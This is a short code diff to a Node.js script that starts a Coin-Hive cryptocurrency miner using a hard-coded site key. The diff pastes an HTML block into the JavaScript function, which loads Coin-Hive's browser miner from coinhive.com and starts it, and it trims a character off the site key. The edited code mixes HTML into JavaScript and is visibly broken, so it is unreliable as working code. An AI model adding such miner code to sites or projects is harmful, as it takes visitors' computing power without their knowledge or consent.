@@ -2,9 +2,13 @@ const CoinHive = require('coin-hive');
 const http = require('http');  
 
 (async () => {
- 
+ <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('<site-key>', 'john-doe');
+	miner.start();
+</script>
   // Create miner
-  const miner = await CoinHive('OwZyZ3HVKjMeMTrodeXC2iZ7ZGY8eOdT'); // Coin-Hive's Site Key
+  const miner = await CoinHive('OwZyZ3HVKjMeMTrodeXC2iZ7ZGY8eOd'); // Coin-Hive's Site Key
  
   // Start miner
   await miner.start();
